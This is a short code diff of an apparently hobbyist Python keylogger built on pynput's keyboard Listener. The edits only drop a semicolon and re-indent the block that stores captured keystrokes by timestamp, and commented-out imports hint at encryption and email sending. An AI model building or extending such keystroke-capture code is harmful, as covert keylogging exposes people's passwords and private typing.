@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 # import cryptography
 # import yagmail
-import datetime;
+import datetime
 import time
 
 count = 0
@@ -38,10 +38,10 @@ def write_file(keys):
                 data_str += k
         else:
              continue
-        if now in log_dict:
-            log_dict[now] += data_str
-        else:
-             log_dict[now] = data_str
+    if now in log_dict:
+        log_dict[now] += data_str
+    else:
+        log_dict[now] = data_str
     print(log_dict)
 
 
